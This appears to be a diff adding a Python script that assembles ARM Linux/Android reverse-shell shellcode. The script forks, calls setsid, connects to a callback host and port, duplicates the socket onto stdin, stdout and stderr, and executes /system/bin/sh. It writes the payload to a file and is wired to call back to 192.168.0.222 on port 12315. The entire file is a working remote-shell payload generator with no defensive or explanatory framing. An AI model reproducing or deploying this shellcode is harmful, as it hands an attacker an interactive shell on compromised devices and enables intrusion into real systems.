@@ -1,0 +1,52 @@
+#!/usr/bin/env python
+
+def shell_reverse_tcp(cb_host, cb_port):
+    import struct
+    import socket
+    # linux/armle/shell_reverse_tcp (modified to pass env and fork/exit)
+    buf = ''
+    # fork
+    buf += '\x02\x70\xa0\xe3'
+    buf += '\x00\x00\x00\xef'
+    # continue if not parent...
+    buf += '\x00\x00\x50\xe3'
+    buf += '\x02\x00\x00\x0a'
+    # exit parent
+    buf += '\x00\x00\xa0\xe3'
+    buf += '\x01\x70\xa0\xe3'
+    buf += '\x00\x00\x00\xef'
+    # setsid in child
+    buf += '\x42\x70\xa0\xe3'
+    buf += '\x00\x00\x00\xef'
+    # socket/connect/dup2/dup2/dup2
+    buf += '\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c'
+    buf += '\x70\xa0\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60'
+    buf += '\xa0\xe1\x6c\x10\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0'
+    buf += '\xe3\x8e\x70\x87\xe2\x00\x00\x00\xef\x06\x00\xa0\xe1'
+    buf += '\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x06'
+    buf += '\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00'
+    buf += '\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0'
+    buf += '\xe3\x00\x00\x00\xef'
+    # execve(shell, argv, env)
+    buf += '\x30\x00\x8f\xe2\x04\x40\x24\xe0'
+    buf += '\x10\x00\x2d\xe9\x38\x30\x8f\xe2\x08\x00\x2d\xe9\x0d'
+    buf += '\x20\xa0\xe1\x10\x00\x2d\xe9\x24\x40\x8f\xe2\x10\x00'
+    buf += '\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00'
+    buf += '\xef\x02\x00'
+    # Add the connect back host/port
+    buf += struct.pack('!H', cb_port)
+    cb_host = socket.inet_aton(cb_host)
+    buf += struct.pack('=4s', cb_host)
+    # shell -
+    buf += '/system/bin/sh\x00\x00'
+    # argv -
+    buf += 'sh\x00\x00'
+    # env -
+    buf += 'PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\x00'
+    with open('shell_reverse_tcp', 'wb') as f:
+        f.write(buf)
+    return buf
+
+
+if __name__ == '__main__':
+    shell_reverse_tcp('192.168.0.222', 12315)
